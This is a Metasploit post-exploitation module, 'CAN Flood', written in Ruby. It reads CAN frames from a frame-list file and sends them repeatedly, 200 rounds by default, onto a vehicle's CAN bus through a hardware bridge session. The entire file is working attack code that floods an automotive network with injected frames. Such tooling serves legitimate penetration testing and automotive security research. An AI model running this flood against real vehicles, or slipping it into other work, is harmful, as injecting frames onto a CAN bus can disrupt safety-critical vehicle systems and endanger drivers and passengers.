##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  DEFAULT_FRAMELIST = File.join(Msf::Config.data_directory, 'wordlists', 'can_flood_frames.txt')

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'CAN Flood',
      'Description'  => 'This module floods a CAN interface with supplied frames.',
      'Author'       => 'Pietro Biondi',
      'License'      => MSF_LICENSE,
      'Platform'     => 'hardware',
      'SessionTypes' => ['hwbridge']
    ))

    register_options([
      OptString.new('CANBUS',    [true, 'CAN interface']),
      OptString.new('FRAMELIST', [true, 'Path to frame list file', DEFAULT_FRAMELIST]),
      OptInt.new('ROUNDS',       [true, 'Number of executed rounds', 200])
    ])
  end

  def run
    unless File.exist?(datastore['FRAMELIST'])
      print_error("Frame list file '#{datastore['FRAMELIST']}' does not exist")
      return
    end

    vprint_status("Reading frame list file: #{datastore['FRAMELIST']}")
    frames = File.readlines(datastore['FRAMELIST']).map { |line| line.strip.split('+') }

    print_status(' -- FLOODING -- ')
    datastore['ROUNDS'].times do
      frames.each { |frame| client.automotive.cansend(datastore['CANBUS'], frame[0], frame[1]) }
    end
  end

end
